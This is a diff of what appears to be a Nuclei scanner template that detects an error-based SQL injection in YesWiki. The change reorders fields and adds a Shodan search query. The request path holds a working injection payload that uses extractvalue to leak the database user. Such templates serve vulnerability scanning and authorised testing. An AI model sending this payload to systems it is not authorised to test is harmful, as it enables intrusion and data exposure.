@@ -1,5 +1,4 @@
 id: yeswiki-sql
-
 info:
   name: YesWiki <2022-07-07 - SQL Injection
   author: arafatansari
@@ -15,26 +14,24 @@ info:
     cpe: cpe:2.3:a:yeswiki:cercopitheque:*:*:*:*:*:*:*:*
   metadata:
     runzero-match: service["http.body"] matches "(?i)yeswiki"
-    verified: true
     max-request: 1
+    product: cercopitheque
+    shodan-query: http.html:"yeswiki"
     vendor: yeswiki
-  tags: yeswiki,sqli,huntr,vuln
+    verified: true
+  tags: huntr,sqli,vuln,yeswiki
 variables:
   num: "999999999"
-
 http:
-  - method: GET
+  - matchers:
+      - part: body
+        type: word
+        words:
+          - c8c605999f3d8352d7bb792cf3f
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    method: GET
     path:
       - '{{BaseURL}}/?PagePrincipale/rss&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5({{num}}),1,user()))))--+-'
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - 'c8c605999f3d8352d7bb792cf3f'
-
-      - type: status
-        status:
-          - 200
-
